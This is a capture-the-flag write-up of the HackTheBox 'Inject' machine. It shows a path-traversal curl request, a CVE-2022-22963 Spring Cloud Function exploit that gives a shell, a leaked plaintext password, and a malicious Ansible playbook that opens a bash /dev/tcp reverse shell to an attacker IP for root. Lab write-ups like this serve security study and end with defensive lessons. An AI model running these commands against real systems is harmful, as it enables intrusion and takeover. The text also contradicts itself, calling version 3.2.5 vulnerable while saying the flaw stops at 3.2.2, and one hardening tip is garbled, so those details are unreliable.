---
title: "Inject"
date: 2023-04-01
type: docs
tags:
  - htb
  - linux
  - easy
  - path-traversal
  - lfi
  - spring-cloud-function
  - cve-2022-22963
  - spel-injection
  - maven
  - ansible
  - writable-cron
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2023-04-01, **IP:** `10.10.11.204` → `inject.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Upload page + `show_image?img=` is **path traversal / LFI** → read `/etc/passwd` (users `frank`, `phil`) and the webapp's `pom.xml`, revealing **Spring Cloud Function 3.2.5**.
2. **CVE-2022-22963** (Spring Cloud Function SpEL injection via the `spring.cloud.function.routing-expression` header) → RCE → shell as **`frank`**.
3. `frank`'s `~/.m2/settings.xml` contains `phil : DocPhillovestoInject123` → `su phil`.
4. `phil` is in group **`staff`**, which can write into `/opt/automation/tasks/`. A root cron runs every Ansible **playbook** in that dir → drop `playbook_2.yml` with a reverse-shell task → root.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `frank` `~/.m2/settings.xml` | `phil : DocPhillovestoInject123` |
| `user.txt` | `/home/phil/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

What I liked most about Inject was how it forced me to treat a file-read bug as a reconnaissance tool rather than an end in itself. The image-viewer traversal doesn't hand you a shell on its own, but I quickly realized its real value: pointing it at the application's build metadata told me exactly what framework and version I was dealing with, Spring Cloud Function 3.2.5, and that version number was the whole game. Once I had it, the RCE practically named itself. From there the box turns into a loot-chaining exercise (a Maven `settings.xml` sitting around with a plaintext password) capped off by a **writable automation directory** privilege escalation: I couldn't touch the existing Ansible playbook root was already running, but nothing stopped me from dropping a brand-new one into the same directory and letting root's cron execute it for me. It's a solid reminder to always ask "what is this app actually running underneath me" before jumping straight to exploit-searching, and a good example of Ansible automation itself becoming an attack surface.

I've hit this same "read config to fingerprint before exploiting" pattern on several other boxes, so it's worth linking them together: for LFI and path traversal specifically, see [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), and [Bagel](/writeups/hackthebox/linux/medium/bagel/); for using leaked build metadata to pin down the exact CVE, [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/) (via a `.git` directory and a binary) and [Heal](/writeups/hackthebox/linux/medium/heal/) both follow the same logic; and for writable cron/task directories as a root path, I ran the same playbook (pun intended) on [Previse](/writeups/hackthebox/linux/easy/previse/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/), and [Jupiter](/writeups/hackthebox/linux/medium/jupiter/).

---

## Full Walkthrough

![Pasted image 20240215184743](Pasted-image-20240215184743.png)

The upload page only accepts image files, which told me the interesting attack surface was probably in how those images get served back rather than in the upload validation itself.

![Pasted image 20240215191838](Pasted-image-20240215191838.png)

I uploaded a normal image first just to see how the application handled a legitimate file and to get a feel for the `show_image` endpoint's parameters. Once I saw it took a filename directly, testing for path traversal was the obvious next step.

```bash
curl -vv 'http://inject.htb:8080/show_image?img=../../../../../../../../../../../../../../etc/passwd'
```

```console
root:x:0:0:root:/root:/bin/bash
...
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

<div class="callout callout-note">

**Turn the LFI into stack recon**

My approach with any arbitrary file read like this is to resist the urge to immediately hunt for a shell and instead use it to learn exactly *what the app is* first. For a Java web application, that means going after the files that reveal dependency versions and configuration: `pom.xml` or `build.gradle` for the former, `application.properties` or `application.yml` for the latter (which often also leak internal hostnames or credentials), and the source tree under something like `/var/www/WEB-INF` or the project's own directory. I applied that here and read `../webapp/pom.xml`, which showed `spring-cloud-function-web` at version **3.2.5**, the exact vulnerable release. When the standard files don't pan out, `/proc/self/environ` and `/proc/self/cwd/…` are worth trying too, since they can leak the running process's environment and working directory.

</div>

With the version pinned down through that XML file in the `webapp` directory, I knew exactly which advisory to go looking for. Spring Cloud Function 3.2.5 pointed straight at **CVE-2022-22963**, and researching that CVE gave me everything I needed to turn the finding into a working shell.

<div class="callout callout-note">

**CVE-2022-22963, Spring Cloud Function SpEL RCE**

The root cause here is that Spring Cloud Function versions up to and including 3.2.2 will evaluate the `spring.cloud.function.routing-expression` request header as a **SpEL** expression whenever the `functionRouter` is in use, rather than treating it as inert routing metadata. That means anything I put in that header gets executed as code by the Spring expression engine. Sending `T(java.lang.Runtime).getRuntime().exec(...)` inside the header runs as the application user, and the whole thing takes a single unauthenticated request, no session, no prior foothold needed. It's worth being careful not to confuse this with Spring4Shell (CVE-2022-22965), which broke the same week and gets mixed up with this one constantly.

</div>

```console
└─[$]> python3 exploit.py -u http://inject.htb:8080
[+] http://inject.htb:8080 is vulnerable
[/] Attempt to take a reverse shell? [y/n] y
Connection received on 10.10.11.204 51776
frank@inject:/$
```

linpeas would not run here, so I enumerated by hand. In frank's home there's a `.m2` folder (Maven); `settings.xml` holds credentials for `phil`:

```xml
<server>
  <id>Inject</id>
  <username>phil</username>
  <password>DocPhillovestoInject123</password>
</server>
```

```bash
su phil        # DocPhillovestoInject123
```

linpeas runs fine as `phil`. The key finding is that `phil` belongs to the `staff` group:

```console
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ ls -al /opt/automation/tasks/
drwxrwxr-x 2 root staff 4096 ... .
-rw-r--r-- 1 root root   150 ... playbook_1.yml
```

```yaml
# /opt/automation/tasks/playbook_1.yml  - run by root's cron
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd: { name: webapp, enabled: yes, state: started }
```

<div class="callout callout-note">

**Writable task directory + Ansible = root**

The cron runs `ansible-playbook` against **every** `*.yml` in `/opt/automation/tasks/`. You can't overwrite `playbook_1.yml` (owned by root), but the directory is group-writable by `staff`, so you can **create** `playbook_2.yml`. Ansible playbooks run tasks as the invoking user (root) and the `shell`/`command` modules are arbitrary execution. The cron re-creates/cleans files quickly, so stage the payload and drop it fast. `pspy` confirms the interval.

</div>

```yaml
# playbook_2.yml
- hosts: localhost
  tasks:
  - name: shell
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.77/9002 0>&1'
```

```console
└─[$]> nc -lnvvp 9002
Connection received on 10.10.11.204 54618
root@inject:/opt/automation/tasks#
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/phil/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **An LFI is a reconnaissance tool.** Read build files and configs to identify exact versions before searching for exploits.
- **Canonicalise and confine file paths**. Reject `. `, resolve with `realpath`, and check the result is inside an allowed base directory.
- **Patch Spring Cloud Function** (and audit for Spring4Shell at the same time).
- **Maven `settings.xml`, `~/.m2`, `~/.aws`, `~/.docker/config.json`, `~/.git-credentials`** routinely hold plaintext secrets. Always check them post-foothold.
- **A group-writable automation directory is root** if root runs its contents. Lock down `/opt/**` perms and run schedulers from a fixed, root-only path.

---

## Related Writeups

- **LFI / path traversal:** [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Read metadata → find the CVE:** [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Writable cron / task dir → root:** [Previse](/writeups/hackthebox/linux/easy/previse/), [mkingdom](/writeups/tryhackme/linux/easy/mkingdom/), [Jupiter](/writeups/hackthebox/linux/medium/jupiter/)
- **Secrets in dev tool configs:** [Inject](/writeups/hackthebox/linux/easy/inject/) `.m2`, see also [Cat](/writeups/hackthebox/linux/medium/cat/) / [Backdoor](/writeups/hackthebox/linux/easy/backdoor/)

## References

- CVE-2022-22963 <https://nvd.nist.gov/vuln/detail/CVE-2022-22963>
- Spring advisory <https://spring.io/security/cve-2022-22963>
- Ansible playbook basics <https://docs.ansible.com/ansible/latest/playbook_guide/>
